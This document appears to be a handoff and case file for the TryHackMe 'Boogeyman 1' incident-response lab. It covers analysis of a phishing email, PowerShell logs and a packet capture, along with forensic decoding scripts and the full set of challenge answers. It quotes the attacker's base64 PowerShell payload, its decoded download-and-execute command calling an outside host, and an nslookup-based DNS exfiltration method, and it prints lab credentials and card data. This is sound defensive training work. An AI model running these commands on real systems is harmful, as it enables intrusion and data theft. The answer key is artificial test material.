# PROJECT HANDOFF & INCIDENT RESPONSE CASE FILE: BOOGEYMAN 1
**Role / Context for AI Assistant:**
We are investigating the "Boogeyman 1" SOC Level 1 Capstone challenge on TryHackMe inside a local Kali Linux UTM VM (`~/thm/boogeyman1`). 
- **Goal 1:** Prioritize deep conceptual DFIR understanding and manual CLI forensics (`awk`, `sed`, `jq`, `tshark`/`Wireshark`) over quick walkthrough answers.
- **Goal 2:** Build a formal, internship-ready SOC Incident Response Portfolio Report (`INC-2023-0113-BGM1`) as we complete each task, pausing after each phase to capture clean terminal screenshots and SHA-256 hashes before moving on.

---

## CURRENT PROGRESS TRACKER
- [x] **Artifact Acquisition:** Transferred `dump.eml`, `powershell.json`, and `capture.pcapng` from the TryHackMe VM to local Kali VM (`~/thm/boogeyman1`).
- [x] **Task 2 (Email Analysis - `dump.eml`):** Completed 100% + Captured all Phase 1 Portfolio Screenshots & SHA-256 hashes.
- [x] **Task 3 (Endpoint Security - `powershell.json`):** Completed 100% + Extracted full post-exploitation timeline & captured Phase 2 screenshots.
- [x] **Task 4 (Network Traffic Analysis - `capture.pcapng`):** Completed 100% + Extracted credentials, carved KeePass vault via DNS queries, and decrypted stolen corporate credit card.
- [ ] **Final Portfolio PDF Compilation:** Ready for user review and optional compilation into PDF format.

---

## COMPLETED FINDINGS & ANSWERS (PHASE 1 / TASK 2)
1. **Attacker / Sender Email:** `agriffin@bpakcaging.xyz` (Arthur Griffin - typosquatted domain mimicking `bpackaging.xyz`).
2. **Victim Email:** `julianne.westcott@hotmail.com` (Julianne Westcott, Finance Dept at Quick Logistics LLC).
3. **Third-Party Mail Relay Service:** `Elastic Email` (`d=elasticemail.com`, Sender IP `15.235.99.80`).
4. **Attachment & Password:** `Invoice.zip` (carved from raw MIME Base64 in `dump.eml`), unlocked with password `Invoice2023!`.
5. **Extracted Malicious File:** `Invoice_20230103.lnk` (Disguised with `C:\Users\Administrator\Desktop\excel.ico`, Run Window: `Show Minimized No Activate`).
6. **Encoded Stage-1 Payload (`-nop -windowstyle hidden -enc`):**
   `aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==`
7. **Decoded Stage-1 Command:**
   `iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')`

---

## COMPLETED FINDINGS & ANSWERS (PHASE 2 / TASK 3)
1. **Domains used for file hosting and C2:** `cdn.bpakcaging.xyz,files.bpakcaging.xyz` (alphabetical order).
2. **Enumeration tool downloaded:** `Seatbelt` (initial GitHub attempt `Invoke-Seatbelt.ps1`, executed as `Seatbelt.exe -group=user`).
3. **File accessed using downloaded `sq3.exe` binary:** `C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite` (escaped backslashes).
4. **Software using the database file:** `Microsoft Sticky Notes`.
5. **Name of exfiltrated file:** `protected_data.kdbx`.
6. **File type using `.kdbx` extension:** `keepass` (or `KeePass database`).
7. **Encoding used during exfiltration attempt:** `hex` (PowerShell byte conversion: `ToString X2`).
8. **Tool used for exfiltration:** `nslookup` (DNS exfiltration loop).

---

## COMPLETED FINDINGS & ANSWERS (PHASE 3 / TASK 4)
1. **Payload Server Software:** `Python`  
   *Evidence:* Wireshark Frame 33256 HTTP response header `Server: SimpleHTTP/0.6 Python/3.10.7` on `167.71.211.113:80`.
2. **C2 Command Output HTTP Method:** `POST`  
   *Evidence:* Frame 44467 / TCP Stream 752 sending execution output to `http://cdn.bpakcaging.xyz:8080/27fe2489` with header `X-38d2-8f49`.
3. **Exfiltration Protocol:** `DNS`  
   *Evidence:* Thousands of recursive `A` record queries transmitted via `nslookup` to destination `167.71.211.113`.
4. **Exfiltrated File Password:** `%p9^3!lL^Mz47E2GaT^y`  
   *Evidence:* Decoded decimal ASCII payload in Frame 44467 containing `plum.sqlite` Sticky Notes dump with Julianne Westcott's KeePass Master Password.
5. **Stored Credit Card in Exfiltrated Vault:** `4024007128269551`  
   *Evidence:* Unlocked carved KeePass database `protected_data_carved.kdbx` via `keepassxc-cli show protected_data_carved.kdbx -s --all "Homebanking/Company Card"`:
   * **Company:** Quick Logistics LLC
   * **Card Number:** `4024007128269551`
   * **CVV:** `970`
   * **Expiration Date:** `3/2028`

---

## FORENSIC ARTIFACT & SCREENSHOT INVENTORY

All 14 screenshots have been verified with clean red bounding boxes and synchronized in `incident-reports/boogeyman-1-investigation/screenshots/`:

| Screenshot | Phase / Task | Forensic Value / Annotated Findings |
|---|---|---|
| `hashes_on_kalivm.png` | Phase 1 (Custody) | SHA-256 hashes of `dump.eml`, `powershell.json`, `capture.pcapng` on local Kali VM |
| `thmvm_hashes.png` | Phase 1 (Custody) | Matching SHA-256 hashes on remote THM VM proving evidence integrity |
| `invoicezip_and_invoicelnk_hash.png` | Phase 1 (Custody) | SHA-256 hashes of carved `Invoice.zip` and extracted `Invoice_20230103.lnk` |
| `grep-E_keywords.png` | Phase 1 (Email) | Grep output highlighting SPF Pass, Elastic Email DKIM, and sender/recipient headers |
| `exiftool_on_lnkfile.png` | Phase 1 (Malware) | ExifTool metadata revealing `excel.ico` masquerading and base64 powershell arguments |
| `seatbelt.png` | Phase 2 (Endpoint) | Event ID 4104 showing Seatbelt download and execution with `-group=user` |
| `sq3.png` | Phase 2 (Endpoint) | Event ID 4104 showing `sq3.exe` download and `plum.sqlite` query |
| `exflitration_using_hex.png` | Phase 2 (Endpoint) | Event ID 4104 showing byte staging, `ToString X2` hex encoding, and `nslookup` loop |
| `http_response_server.png` | Phase 3 (Network) | Frame 33256 HTTP response header `Server: SimpleHTTP/0.6 Python/3.10.7` |
| `wireshark_hex_44467.png` | Phase 3 (Network) | TCP Stream 752 Frame 44467 showing `POST /27fe2489` and space-delimited decimal payload |
| `cyberchef_decoding.png` | Phase 3 (Network) | CyberChef `From Decimal` recipe decoding Sticky Notes dump with master password |
| `master_password.png` | Phase 3 (Network) | Terminal output displaying decoded `%p9^3!lL^Mz47E2GaT^y` from Frame 44467 |
| `dns_queries_name.png` | Phase 3 (Network) | Wireshark showing 50-character hexadecimal DNS `A` queries directed to `167.71.211.113` |
| `keepassxc.png` | Phase 3 (Network) | `keepassxc-cli` output unlocking Quick Logistics LLC credit card `4024007128269551` |

---

## REPRODUCIBLE FORENSIC PIPELINES

### 1. C2 Decimal Byte Decoding (Frame 44467)
```python
# Raw space-delimited decimal integers in Frame 44467 POST payload
raw_decimal = "123 34 105 100 34 58 ... 34 125"
decoded_chars = [chr(int(x)) for x in raw_decimal.split()]
print("".join(decoded_chars))
```

### 2. DNS KeePass Database Carving Pipeline
```python
import binascii

# Extract unique sequential hex chunks from capture.pcapng
chunks = []
last_chunk = ""

# For each query sent to 167.71.211.113:
for query in dns_queries:
    subdomain = query.split('.bpakcaging.xyz')[0]
    if len(subdomain) in (48, 50) and all(c in '0123456789ABCDEFabcdef' for c in subdomain):
        if subdomain != last_chunk:  # Deduplicate nslookup retransmission retries
            chunks.append(subdomain)
            last_chunk = subdomain

hex_data = "".join(chunks)
binary_db = binascii.unhexlify(hex_data)

with open("protected_data_carved.kdbx", "wb") as f:
    f.write(binary_db)

# Validates KeePass 2.x Magic Header: 03 D9 A2 9A 67 FB 4B B5 (2,206 bytes)
```

### 3. KeePass Vault Decryption
```bash
keepassxc-cli show protected_data_carved.kdbx -s --all "Homebanking/Company Card"
# Enter password: %p9^3!lL^Mz47E2GaT^y
```
